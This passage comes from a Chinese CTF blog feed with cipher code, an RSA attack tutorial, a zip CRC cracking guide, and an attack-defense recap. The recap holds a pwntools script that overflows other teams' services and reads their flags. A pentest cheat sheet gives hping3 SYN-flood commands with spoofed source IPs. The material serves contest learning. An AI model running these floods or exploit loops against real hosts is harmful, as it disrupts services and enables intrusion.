ROTL(L[B]+X+Y,(X+Y)); B = (B+1) % c; &#125; for (i=0;i&lt;t;i++)//16进制输出 &#123; printf("%.4X ",ChildKeyS[i]); &#125; printf("\n");&#125;/**5、 加密函数 加密函数 */void Encipher(TWOBYTEINT * In,TWOBYTEINT * Out,TWOBYTEINT* S)&#123; TWOBYTEINT X,Y; //定义两个32位存储器 int i,j; for(j=0;j&lt;NoOfData;j+=2) &#123; X = In[j]+S[0]; Y = In[j+1]+S[1]; for( i=1;i&lt;=r;i++) &#123; X=ROTL((X^Y),Y) + S[2*i]; //异或，循环移位，相加 Y=ROTL((Y^X),X) + S[2*i+1]; &#125; Out[j]=X; Out[j+1]=Y; //密文 &#125;&#125;/**6、 解密函数 解密函数 */void Decipher(TWOBYTEINT* In,TWOBYTEINT* Out,TWOBYTEINT* S)&#123; int i=0,j; TWOBYTEINT X,Y; for(j=0;j&lt;NoOfData;j+=2) &#123; X = In[j]; Y = In[j+1]; for(i=r;i&gt;0;i--) &#123;// Y = ROTR(Y-S[2*i+1],X)^X; //相减，循环移位，异或// X = ROTR(X-S[2*i],Y)^Y; // Y = ROTR(Y-S[2*i+1],X)^X; //相减，循环移位，异或// X = ROTR(X-S[2*i],Y)^Y;// 改为（对数据进行强制转换）： Y = ROTR((unsigned short int)(Y-S[2*i+1]),X)^X; X = ROTR((unsigned short int)(X-S[2*i]),Y)^Y; &#125; Out[j]=X - S[0]; Out[j+1]=Y - S[1]; //明文 &#125;&#125;/**7、 主函数测试 主函数 */int main(void)&#123; TWOBYTEINT ChildKeyS[2*r+2]; //64bit TWOBYTEINT ChildKey1[26]=&#123;0x9b9a&#125;; //&#123;0xe25b,0x4338,0x36ab,0xd59f,0x9b9a,0xc0f1,0xdc4f, // 0xc0d2,0xf03a,0xff5a,0x771f,0x5952,0xb797,0x28ad, //0x5c9a,0xfd9a,0xbd4b,0x3b12,0xd198,0x17f8,0x7f19, //0x458e,0x1629,0xaa8a,0xb609,0x9b3c&#125;;//&#123;123,434,1,123,1,34,123,56,123,8&#125;; BYTE KeyK[b];//8bit=byte InitialKey(KeyK,b); //生成初始密钥 int k; generateChildKey(KeyK,ChildKeyS); //根据初始密钥生成子密钥// TWOBYTEINT Source[]=&#123;'1','2','1','1'&#125;;//测试明文 char arr[] = "what can i do for you?"; unsigned long ll = strlen(arr); int m; for (m=0; NoOfData * m &lt; ll; m++) &#123; TWOBYTEINT Source[4] = &#123;arr[4 * m], arr[4 * m + 1], arr[4 * m + 2], arr[4 * m + 3]&#125;; printf("加密以前的明文:"); for (k=0;k&lt;NoOfData;k++) &#123; printf("%.4X ",Source[k]); //16进制输出 printf("%c ",Source[k]); //16进制输出 &#125; printf("\n"); TWOBYTEINT Dest[NoOfData]; //用来存储密文 for(k=0;k&lt;26;k++) &#123; ChildKey1[k]=ChildKeyS[k];//如果此处自定义简单的数值为加密密钥，则可以解密出密文 printf("%.4X ",ChildKey1[k]); &#125; Encipher(Source,Dest,ChildKey1); //加密 printf("\n"); printf("加密以后的密文:"); for (k=0;k&lt;NoOfData;k++) &#123; printf("%.4X ",Dest[k]); printf("%c ",Dest[k]); &#125; printf("\n"); TWOBYTEINT Data[NoOfData]=&#123;0&#125;; //用来存储解密后的密文 Decipher(Dest,Data,ChildKey1); //解密 printf("解密以后的明文:"); for (k=0;k&lt;NoOfData;k++) &#123; printf("%.4X ",Data[k]); printf("%c ",Data[k]); &#125; printf("\n\n\n\n"); &#125; //printf("sizeof unsigned short int: %d",sizeof(unsigned short int)); system("pause\n");&#125; javare412345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public static String HloveyRC4(String aInput,String aKey) &#123; int[] iS = new int[256]; byte[] iK = new byte[256]; for (int i=0;i&lt;256;i++) iS[i]=i; int j = 1; for (short i= 0;i&lt;256;i++) &#123; iK[i]=(byte)aKey.charAt((i % aKey.length())); &#125; j=0; for (int i=0;i&lt;255;i++) &#123; j=(j+iS[i]+iK[i]) % 256; int temp = iS[i]; iS[i]=iS[j]; iS[j]=temp; &#125; int i=0; j=0; char[] iInputChar = aInput.toCharArray(); char[] iOutputChar = new char[iInputChar.length]; for(short x = 0;x&lt;iInputChar.length;x++) &#123; i = (i+1) % 256; j = (j+iS[i]) % 256; int temp = iS[i]; iS[i]=iS[j]; iS[j]=temp; int t = (iS[i]+(iS[j] % 256)) % 256; int iY = iS[t]; char iCY = (char)iY; iOutputChar[x] =(char)( iInputChar[x] ^ iCY) ; &#125; return new String(iOutputChar); &#125; public static void main(String[] args) &#123; String inputStr = "7894dsfdsdfsd"; String key = "abcdefg"; String str = HloveyRC4(inputStr,key); //打印加密后的字符串 System.out.println(str); //打印解密后的字符串 System.out.println(HloveyRC4(str,key)); &#125; byte和Strings互转123456789String str = &quot;hello&quot;;byte[] srtbyte = null;try &#123; srtbyte = str.getBytes(&quot;UTF-8&quot;); String res = new String(srtbyte,&quot;UTF-8&quot;); System.out.println(res); &#125; catch (UnsupportedEncodingException e) &#123; e.printStackTrace(); &#125;]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[第四届MIAC线下总结]]></title>
    <url>%2F2017%2F12%2F04%2Fwp_2017_12_24_miac_xianxia%2F</url>
    <content type="text"><![CDATA[虽然我已经大三了，可是线下这是第二次，表示体验真的是非常不好，不过还是知道自己还是有很多东西要学习 1、环境这是MIAC在决赛，这时不得不提初赛，第一个初赛直接被各种大佬打爆平台，导致所有队伍全部被改名字，主办方只好取消。后面两次虽然成功，但是结果仍然让我们出乎意料(一般都是前20进入决赛，这是前80，难以想象[这里后面证明是正确的])。 2、比赛比赛前一晚：看了比赛规则，发现有一台靶机和一台攻击机机（这是啥）,一小时一轮，一个三轮（后面怀疑主办方的说明，居然一个小时一个题目[一个5小轮]）。于是开始准备各种工具，自动提交flag脚本，通防工具，提取脚本，木马（后来都输给了主板方）。比赛前:80个队伍，做得位置全部不知道（蒙）。终于进场了，都是找了好久，终于找到位置。发现我们只能用攻击机工具别人的靶机（类似实验吧）。第一轮:葛师傅和潘师傅找到web题目，我在找pwn题目（最后，，，一个小时过去了，找不到题目，发现根本没有pwn题目），葛师傅很气愤，因为题目不能下下来。而且，自己电脑和靶机电脑是网络隔离的。不能用ssh连接。第二轮:潘师傅和葛师傅找到mysql的弱密码，然后开始写文件进去，读文件出来，但是不知道为什么不能读到flag,而我只能在那里维护，看看那些ip来连接了我们，然后去杀掉pid.第三轮:mysql的弱密码，这里可以读取flag了。可是这里主办方的flag不能及时刷新，导致我们提交的flag不对，这里问技术人员，他说赛后在谈论。 3、总结1、首先这个比赛没有pwn题，那bin师傅只能看看屏幕了。2、对比赛规则要仔细研究3、liunx下的命令要熟悉 总结:1、一上去可以连接上去，先备份一下所有的镜像文件。2、修改自己的靶机（服务器）的密码，mysql的密码3、看看有哪些题目4、先挂上通防，等主办方来警告就撤下来 4、脚本这里pwn题自动提交flag脚本123456789101112131415161718192021222324252627282930313233343536from pwn import *import requestsimport timecontext(arch = 'amd64')while 1: start = time.time() #p = process('./pwn') for i in range(1, 28): try: #if i == 25: # continue p = remote('172.16.%s.102' % i,20002) p.recv() payload="a"*213 p.sendline(payload) timestart = time.time() p.sendline('cat /home/newcalc/flag') a = p.recvline(timeout=5) print "=============" print a[2:] url_platform = 'http://172.16.200.3:9000/submit_flag/' token = 'L4FBjK6K3nhkTcFMcwDGuWOwqR9GYbghNbtmOc49wjRiKS60SoILVjFgMpj3Etcx7R0wMIrB1os' post_data = &#123; 'token':token, 'flag':a[2:] &#125; r = requests.post(url_platform, data = post_data) timenow = time.time()-timestart if(timenow == 5): continue #p.interactive() except: pass end = time.time() time.sleep(300 - (end -start)) 这里是liunx命令:备份数据库mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sqlmysqldump -u root -p 123456 mysql &gt; back.sql备份所有数据库mysqldump --all-databases &gt; bak.sql还原数据库1234mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql find / *.php -perm awk -F: /etc/passwd crontab -l 查看那些端口开放netstat -pantups -anu杀死PIDkill 9511查看tcp连接的数量netstat -ant|awk |grep |sed -e -e |sort|uniq -c|sort -rn找到某个文件find / -name 文件名解压tar -xvf file.tarunzip file.zipunrar e file.rar连接ssh1234ssh root@192.168.1.14yespasswordifconfig 登录mysql数据库12mysql -u root -h -p123456ifconfig 将/var/www/html目录下的文件设置为不允许任何人修改chattr -R +i /var/www/html]]></content>
      <categories>
        <category>wp</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CTF中RSA的常见攻击方法]]></title>
    <url>%2F2017%2F11%2F12%2Fmisc_RAS%2F</url>
    <content type="text"><![CDATA[我不生产RAS,只是RAS的搬运工….. 前言这里就不讨论数论的基础了，进行RSA的题目解答，至少要懂得基本的数论知识的，如果不了解数论的基本知识的话，网上相关内容还是挺多的。 RSA基于一个简单的数论事实，两个大素数相乘十分容易，将其进行因式分解确实困难的。在量子计算机还没有成熟的今天，RSA算法凭借其良好的抵抗各种攻击的能力，在公钥密码体制中发挥着中流砥柱的作用。然而即便RSA算法目前来说是安全可靠的，但是错误的应用场景，错误的环境配置，以及错误的使用方法，都会导致RSA的算法体系出现问题，从而也派生出针对各种特定场景下的RSA攻击方法。 本文针对一些在CTF中常见的RSA攻击方法，从如何识别应该应用那种方法以及如何去解题来介绍CTF中的RSA题目的常见解法。 RSA算法描述RSA算法涉及三个参数，n，e，d，私钥为n，d，公钥为n，e。 其中n是两个大素数p，q的乘积。 d是e模$ varphi(n) $的逆元，$ varphi(n) $是n的欧拉函数。 c为密文，m为明文，则加密过程如下：1$ cequiv m^e mod n $ 解密过程如下：1$ mequiv c^d$ $mod$ $n$ n，e是公开的情况下，想要知道d的值，必须要将n分解计算出n的欧拉函数值，而n是两个大素数p，q的乘积，将其分解是困难的。 RSA题目类型在CTF竞赛中，RSA理所当然处在CRYPTO中居多。而且RSA作为典型的加密算法，其出镜率可谓相当高，基本上所有比赛都会有几道RSA的题目出现。 数据处理在进行做题之前，我们要将数据处理成可以做题的模式。基本上来说，RSA的题目都是围绕着c，m，e，d，n，p，q这几个参数展开的，但是题目一般不会直接给这种样子的参数，而是通过别的方式给出，这里就需要我们使用一些工具或者自己手工将这些参数提取出来。 pem文件：针对此类文件可以直接使用openssl提取(一般在kali)，大概使用过的方式有： 12openssl rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.encopenssl rsa -pubin -text -modulus -in warmup -in public.pem pcap文件： 针对此类文件可以使用wireshark follow一下。这种问题一般都是写了一个交互的crypto系统，所以可能产生多轮交互。 PPC模式： 这种模式是上述pcap文件的交互版，会给一个端口进行一些crypto的交互，参数会在交互中给出。 第二个需要处理的就是明密文，这个方法多多，不多赘述。 RAS攻击方法模数分解说一说解决RSA题目最简单，最暴力，最好使的方法就是分解模数n。如果能够将n分解成功，成功得到p，q的取值，那么可求n的欧拉函数的值。1$ varphi(n)=(p-1)(q-1) $ 而通过e，d与n的欧拉函数满足如下关系：1$ed=1$ $mod$ $varphi(n) $ 通过欧几里得算法可以通过e与n的欧拉函数的值轻易求出d，从而计算出解密密钥。即在知道e，p，q的情况下，可以解出d：123456789101112def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % m modinv函数即为求模拟的函数，在知道e，p，q的情况下，可以：1d=modinv(e,(p-1)*(q-1)) 即可求出解密密钥。 写到这里，要提出一个细节问题，在利用python进行rsa的题目求解过程中：1$ cequiv m^e mod n $ 此类运算需要使用pow函数来进行求解，而不是直接m**e % n，这样会慢死的。Python在处理此类运算进行了优化。比如刚才在已知p，q的时候利用modinv函数求出了d，然后就可以利用pow函数求出明文：1m=pow(c,d,n) 例题 https://www.jarvisoj.com(very easy RSA)题目中直接给了p，q，e。可以直接求出d：12345p = 3487583947589437589237958723892346254777q = 8767867843568934765983476584376578389e = 65537d = modinv(e, (p-1)*(q-1))print d 直接分解n介绍素数分解问题是困难的，但是可以通过计算机进行暴力分解。1999年，名为Cray的超级计算机用了5个月时间分解了512bit的n。2009年，一群研究人员成功分解了768bit的n。2010年，又提出了一些针对1024bit的n的分解的途径，但是没有正面分解成功。通常意义上来说，一般认为2048bit以上的n是安全的。现在一般的公钥证书都是4096bit的证书。 如果n比较小，那么可以通过工具进行直接n分解，从而得到私钥。如果n的大小小于256bit，那么我们通过本地工具即可爆破成功。例如采用windows平台的RSATool2v17，可以在几分钟内完成256bit的n的分解。 如果n在768bit或者更高，可以尝试使用一些在线的n分解网站，这些网站会存储一些已经分解成功的n，比如:http://factordb.com 识别此类问题一般是分值较小的题目，提取出n之后可以发现n的长度小于等于512bit，可以直接取分解n。如果大于512bit，建议在使用每个题目都用后面所说的方法去解题。 例题：比如在某次竞赛中，发现：n=87924348264132406875276140514499937145050893665602592992418171647042491658461利用factordb分解 利用公约数如果在两次公钥的加密过程中使用的$n_1$ 和$n_2$具有相同的素因子，那么可以利用欧几里得算法直接将$n_1$和$n_2$分解。通过欧几里得算法可以直接求出$n_1$和$n_2$的最大公约数p：1234567$(n1,n2)=p$可以得出：$n_1=p$$q_1$$n_2=p$$q_2$ 直接分解成功。而欧几里得算法的时间复杂度为：O(log n)。这个时间复杂度即便是4096 bit也是秒破级别。12345678def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return a 识别通常会发现题目给了若干个n，均不相同，并且都是2048bit，4096bit级别，无法正面硬杠，并且明文都没什么联系，e也一般取65537。 例题：在一个题目中，你拿到了两个n，e都为65537，两个n分别为：12n1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743 通过直接分解，上factordb都分解失败。通过尝试发现：1print gcd(n1,n2) 打印出：11564859779720039565508870182569324208117555667917997801104862601098933699462849007879184203051278194180664616470669559575370868384820368930104560074538872199213236203822337186927275879139590248731148622362880471439310489228147093224418374555428793546002109 则此致即为两个n共有的素因子p，然后进一步求出q，求解完毕。 Fermat方法与Pollard rho方法介绍：针对大整数的分解有很多种算法，性能上各有优异，有Fermat方法，Pollard rho方法，试除法，以及椭圆曲线法，连分数法，二次筛选法，数域分析法等等。其中一些方法应用在RSA的攻击上也有奇效。 在p，q的取值差异过大，或者p，q的取值过于相近的时候，Format方法与Pollard rho方法都可以很快将n分解成功。 此类分解方法有一个开源项目yafu将其自动化实现了，不论n的大小，只要p和q存在相差过大或者过近时，都可以通过yafu很快地分解成功。 识别在直接分解n无望，不能利用公约数分解n之后，都应该使用yafu去试一下。 低加密指数攻击在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。 介绍当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。 即：1$ cequiv m^e$ $mod$ $n$ 如果e=3，且$ m^e&lt;{n} $，那么：12$ c= m^e,$ $e=3$$ m=sqrt[3]&#123;c&#125;$ 如果明文的三次方比n大，但是不是足够大，那么设k，有：1$ c= m^e+kn$ 爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。 识别：推荐在e=3的时候首先尝试这种方法 例题:关键代码如下：通过不断给明文+n开三次方即可求得：123456i=0 while 1: if(gmpy.root(c+i*N, 3)[1]==1): print gmpy.root(c+i*N, 3) break i=i+1 低加密指数广播攻击介绍如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。 即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有：12345$ c_1equiv m^e$ $mod$ $n_1$$ c_2equiv m^e$ $mod$ $n_2$$ c_3equiv m^e$ $mod$ $n_3$ 对上述等式运用中国剩余定理，在e=3时，可以得到：1$ c_xequiv m^3$ $mod$ $n_1n_2n_3$ 通过对$ c_x $进行三次开方可以求得明文。 识别：这个识别起来比较简单，一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。 低解密指数攻击介绍：与低加密指数相同，低解密指数可以加快解密的过程，但是者也带来了安全问题。Wiener表示如果满足：1$ d&lt;frac&#123;1&#125;&#123;3&#125;gn^frac&#123;1&#125;&#123;4&#125;$ &gt; 那么一种基于连分数(一个数论当中的问题)的特殊攻击类型就可以危害RSA的安全。此时需要满足：1$q&lt;$$p$$&lt;2q$ 如果满足上述条件，通过Wiener Attack可以在多项式时间中分解n。rsa-wiener-attack的攻击源码开源在了github中，采取python编写，可以很容易使用。 识别非常简单，e看起来很大就行了。 例题：直接github用工具就行。https://github.com/pablocelayes/rsa-wiener-attack这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上：12import syssys.setrecursionlimit(10000000) 共模攻击如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。即：123$ c_1equiv m^&#123;e_1&#125;$ $mod$ $n$$ c_2equiv m^&#123;e_2&#125;$ $mod$ $n$ 此时不需要分解n，不需要求解私钥，如果两个加密指数互素，就可以通过共模攻击在两个密文和公钥被嗅探到的情况下还原出明文m的值。过程如下，首先两个加密指数互质，则：123456789101112131415 $ (e_1,e_2)=1 $即存在$ s_2 $，$ s_2 $使得：$ s_1e_1+s_2e_2=1 $又因为：$ c_1equiv m^&#123;e_1&#125;$ $mod$ $n$$ c_2equiv m^&#123;e_2&#125;$ $mod$ $n$通过代入化简可以得出：$c_1^&#123;s_1&#125;c_2^&#123;s_2&#125;equiv m$ $mod$ $n$ 明文解出。 识别：非常简单，若干次加密，每次n都一样，明文根据题意也一样即可。 例题：https://www.jarvisoj.com(very hard RSA)如果已知：n1，n2，c1，c2，e1，e2，并且其中n1=n2的话：123456789101112s = egcd(e1, e2) s1 = s[1] s2 = s[2] print s n=n1 if s1&lt;0: s1 = - s1 c1 = modinv(c1, n) elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n) m=(pow(c1,s1,n)*pow(c2,s2,n)) % n 转载 https://www.anquanke.com/post/id/84632]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[给你压缩包却又不给你密码的人在想什么]]></title>
    <url>%2F2017%2F11%2F11%2Fmisc_crc%2F</url>
    <content type="text"><![CDATA[当然是有秘密不能给汝看，必学中华人民共和国网络安全法 1、压缩包1、rar加密压缩包1、爆破直接用ARCHPR爆破，这里有些技巧，数字1-10位跑一下（大概2分钟），字母跑6位左右，如果跑不出来，那这道题你就走偏啦。 2、CRC明文攻击这里和zip文明攻击一样的，代码在zip明文攻击那里。 2、zip加密压缩包1、看看是不是伪加密010打开zip压缩包，伪加密的修改为正常的可以打开了 kali也可以直接提取zip伪加密？？？ 1、爆破直接用ARCHPR爆破，这里有些技巧，数字1-10位跑一下（大概2分钟），字母跑6位左右，如果跑不出来，那这道题你就走偏啦。 2、CRC明文攻击如果是这样的,就可以啦取出zip中的CRCpython代码1234567891011121314151617import zipfile, osimport binasciic=[]rootname = 'misc_big_zip.zip';r = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@";for i in range(1,41): if i &lt; 10: t = "0" + str(i) else: t = str(i) name = "small_" + t + ".txt"; print name; zipFile = zipfile.ZipFile(os.path.join(os.getcwd(), rootname)); zipinfo = zipFile.getinfo(name); crcs = zipinfo.CRC; c.append(crcs)print c C语言CRC代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091# include&lt;string.h&gt;# include &lt;stdio.h&gt;static unsigned long Crc32_ComputeBuf(const void *buf, size_t bufLen) &#123; static const unsigned long crcTable[256] = &#123; 0x00000000,0x77073096,0xEE0E612C,0x990951BA,0x076DC419,0x706AF48F,0xE963A535, 0x9E6495A3,0x0EDB8832,0x79DCB8A4,0xE0D5E91E,0x97D2D988,0x09B64C2B,0x7EB17CBD, 0xE7B82D07,0x90BF1D91,0x1DB71064,0x6AB020F2,0xF3B97148,0x84BE41DE,0x1ADAD47D, 0x6DDDE4EB,0xF4D4B551,0x83D385C7,0x136C9856,0x646BA8C0,0xFD62F97A,0x8A65C9EC, 0x14015C4F,0x63066CD9,0xFA0F3D63,0x8D080DF5,0x3B6E20C8,0x4C69105E,0xD56041E4, 0xA2677172,0x3C03E4D1,0x4B04D447,0xD20D85FD,0xA50AB56B,0x35B5A8FA,0x42B2986C, 0xDBBBC9D6,0xACBCF940,0x32D86CE3,0x45DF5C75,0xDCD60DCF,0xABD13D59,0x26D930AC, 0x51DE003A,0xC8D75180,0xBFD06116,0x21B4F4B5,0x56B3C423,0xCFBA9599,0xB8BDA50F, 0x2802B89E,0x5F058808,0xC60CD9B2,0xB10BE924,0x2F6F7C87,0x58684C11,0xC1611DAB, 0xB6662D3D,0x76DC4190,0x01DB7106,0x98D220BC,0xEFD5102A,0x71B18589,0x06B6B51F, 0x9FBFE4A5,0xE8B8D433,0x7807C9A2,0x0F00F934,0x9609A88E,0xE10E9818,0x7F6A0DBB, 0x086D3D2D,0x91646C97,0xE6635C01,0x6B6B51F4,0x1C6C6162,0x856530D8,0xF262004E, 0x6C0695ED,0x1B01A57B,0x8208F4C1,0xF50FC457,0x65B0D9C6,0x12B7E950,0x8BBEB8EA, 0xFCB9887C,0x62DD1DDF,0x15DA2D49,0x8CD37CF3,0xFBD44C65,0x4DB26158,0x3AB551CE, 0xA3BC0074,0xD4BB30E2,0x4ADFA541,0x3DD895D7,0xA4D1C46D,0xD3D6F4FB,0x4369E96A, 0x346ED9FC,0xAD678846,0xDA60B8D0,0x44042D73,0x33031DE5,0xAA0A4C5F,0xDD0D7CC9, 0x5005713C,0x270241AA,0xBE0B1010,0xC90C2086,0x5768B525,0x206F85B3,0xB966D409, 0xCE61E49F,0x5EDEF90E,0x29D9C998,0xB0D09822,0xC7D7A8B4,0x59B33D17,0x2EB40D81, 0xB7BD5C3B,0xC0BA6CAD,0xEDB88320,0x9ABFB3B6,0x03B6E20C,0x74B1D29A,0xEAD54739, 0x9DD277AF,0x04DB2615,0x73DC1683,0xE3630B12,0x94643B84,0x0D6D6A3E,0x7A6A5AA8, 0xE40ECF0B,0x9309FF9D,0x0A00AE27,0x7D079EB1,0xF00F9344,0x8708A3D2,0x1E01F268, 0x6906C2FE,0xF762575D,0x806567CB,0x196C3671,0x6E6B06E7,0xFED41B76,0x89D32BE0, 0x10DA7A5A,0x67DD4ACC,0xF9B9DF6F,0x8EBEEFF9,0x17B7BE43,0x60B08ED5,0xD6D6A3E8, 0xA1D1937E,0x38D8C2C4,0x4FDFF252,0xD1BB67F1,0xA6BC5767,0x3FB506DD,0x48B2364B, 0xD80D2BDA,0xAF0A1B4C,0x36034AF6,0x41047A60,0xDF60EFC3,0xA867DF55,0x316E8EEF, 0x4669BE79,0xCB61B38C,0xBC66831A,0x256FD2A0,0x5268E236,0xCC0C7795,0xBB0B4703, 0x220216B9,0x5505262F,0xC5BA3BBE,0xB2BD0B28,0x2BB45A92,0x5CB36A04,0xC2D7FFA7, 0xB5D0CF31,0x2CD99E8B,0x5BDEAE1D,0x9B64C2B0,0xEC63F226,0x756AA39C,0x026D930A, 0x9C0906A9,0xEB0E363F,0x72076785,0x05005713,0x95BF4A82,0xE2B87A14,0x7BB12BAE, 0x0CB61B38,0x92D28E9B,0xE5D5BE0D,0x7CDCEFB7,0x0BDBDF21,0x86D3D2D4,0xF1D4E242, 0x68DDB3F8,0x1FDA836E,0x81BE16CD,0xF6B9265B,0x6FB077E1,0x18B74777,0x88085AE6, 0xFF0F6A70,0x66063BCA,0x11010B5C,0x8F659EFF,0xF862AE69,0x616BFFD3,0x166CCF45, 0xA00AE278,0xD70DD2EE,0x4E048354,0x3903B3C2,0xA7672661,0xD06016F7,0x4969474D, 0x3E6E77DB,0xAED16A4A,0xD9D65ADC,0x40DF0B66,0x37D83BF0,0xA9BCAE53,0xDEBB9EC5, 0x47B2CF7F,0x30B5FFE9,0xBDBDF21C,0xCABAC28A,0x53B39330,0x24B4A3A6,0xBAD03605, 0xCDD70693,0x54DE5729,0x23D967BF,0xB3667A2E,0xC4614AB8,0x5D681B02,0x2A6F2B94, 0xB40BBE37,0xC30C8EA1,0x5A05DF1B,0x2D02EF8D &#125;; unsigned long crc32 = 0xFFFFFFFF; unsigned char *byteBuf; size_t i; byteBuf = (unsigned char*)buf; for (i = 0; i &lt; bufLen; i++) &#123; crc32 = (crc32 &gt;&gt; 8) ^ crcTable[(crc32 ^ byteBuf[i]) &amp; 0xFF]; &#125; return crc32 ^ 0xFFFFFFFF;&#125;static char *charSet = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@\n ";int main() &#123; unsigned long crc32[] = &#123; 1606238046, 1943531056, 3598719407L, 2578797435L, 1405086858, 2143805016, 3234701029L, 3224637410L, 2346013297L, 1146766327, 4038678768L, 3119445409L, 2111148220, 383413051, 2853461348L, 3176759361L, 1852520927, 3083243303L, 2151747034L, 1392140456, 544449252, 1871340857, 574988077, 3459049483L, 2786065872L, 3888485555L, 1716930793, 1933746678, 3178216769L, 3774357278L, 622718466, 1488109481, 525106857, 3123386181L, 3472027048L, 616379830, 3728848209L, 1358333123, 1852520927, 3096466191L, 622718466 &#125;; char tmp[6] = ""; int len = strlen(charSet); for (int h = sizeof(crc32) / sizeof(unsigned long) - 1;h&gt;=0; h--) &#123; for (int a = 0; a &lt; len; a++) &#123; tmp[0] = charSet[a]; for (int b = 0; b &lt; len; b++) &#123; tmp[1] = charSet[b]; for (int c = 0; c &lt; len; c++) &#123; tmp[2] = charSet[c]; for (int d = 0; d &lt; len; d++) &#123; tmp[3] = charSet[d]; for (int e = 0; e &lt; len; e++) &#123; tmp[4] = charSet[e]; if (Crc32_ComputeBuf(tmp, strlen(tmp)) == crc32[h]) &#123; printf("%s", tmp); //goto label; //若是存在碰撞，那么这里可以将这里注释掉 &#125; &#125; &#125; &#125; &#125; &#125; label : ; printf("\n"); &#125; return 0;&#125; 得到明文，要看看是什么压缩算法的，只有压缩算法相同，才能用已知明文攻击。查看加密算法，建议用7z查看，将得到的明文加密，在与需要解密的压缩包做比较，这样算法一样的，就可以用已知明文攻击 2、网络安全法https://www.virzz.com/2017/06/01/Network_security_law_of_the_PRC.html 可以用ARCHPR和AZPR这里贴个链接吧https://jingyan.baidu.com/article/3052f5a1f62d6597f31f861c.html]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[linux渗透测试]]></title>
    <url>%2F2017%2F11%2F09%2Fmisc_infiltration%2F</url>
    <content type="text"><![CDATA[闲来无事做，不如来渗透啥为渗透，只限教学 1、主机发现与端口扫描nmapnmap [扫描类型…] [通用选项] {扫描目标说明} 1nmap -v -sS 192.168.1.10-254 扫描10-254这段ip的主机，-p为扫描端口-sS :TCP同步扫描(TCP SYN),因为不必全部打开一个TCP连接,所以这项技术通常称为半开扫描(half-open)。这项技术最大的好处是,很少有系统能够把这记入系统日志。不过，你需要root权限来定制SYN数据包。-sN :秘密扫描，有时可以骗过防火墙-v :冗余模式。强烈推荐使用这个选项，它会给出扫描过程中的详细信息。-p :如-p1-65535,扫描每台主机的1-65535端口-A :详细扫描 netdiscovernetdiscover [通用选项] [ip]1netdiscover -r 192.168.0.1/24 -p :被动扫描(贼慢)扫描一个子网段当然还有其他的扫描工具啦。etc 2、doshping31hping3 -I eth0 -S 192.168.0.50 -a 10.10.10.1 -p 80 -i u1000 向192.168.0.50主机80端口发起dos攻击，将自己ip伪装成10.10.10.11hping3 -P -U --flood -V -a --rand-soucer -S 10.21.13.97 伪造IP地址的简单的SYN洪水攻击――使用HPING3的DoS-a –rand-source : 使用随机性的源头IP地址。 nping1234nping --tcp -p 80 --flags rst --ttl 2 192.168.1.1nping --icmp --icmp-type time --delay 500ms 192.168.254.254nping --echo-server "public" -e wlan0 -vvv nping --echo-client "public" echo.nmap.org --tcp -p1-1024 --flags ack 3、iptablesiptables -A INPUT -j DROP屏蔽所有ip参考:https://esebanana.github.io/page/2/]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PWN为了入群做题]]></title>
    <url>%2F2017%2F11%2F03%2Fpwn_ruqun%2F</url>
    <content type="text"><![CDATA[想学习，必要了解各位师傅，必入群 1、x641、程序拿到题目链接：http://pan.baidu.com/s/1pKTjqgr 密码：dhw5checksec pwn21234567 Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled` 程序可以知道是６４位的，它的传参优先由寄存器完成。接着，我们应该了解程序的流程，以及找到程序的漏洞，以及思考其利用方式。 2、分析程序我们去尝试运行，摸清了基本上的程序的功能。1234567891011121314151617181920212223242526272829root@kali:pwn2# ./pwn2 Welcome to an easy Return Oriented Programming challenge...Menu:1) Get libc address2) Get address of a libc function3) Nom nom r0p buffer to stack4) Exit: 1libc.so.6: 0x00007FB8DF81A9B01) Get libc address2) Get address of a libc function3) Nom nom r0p buffer to stack4) Exit: 2Enter symbol: systemSymbol system: 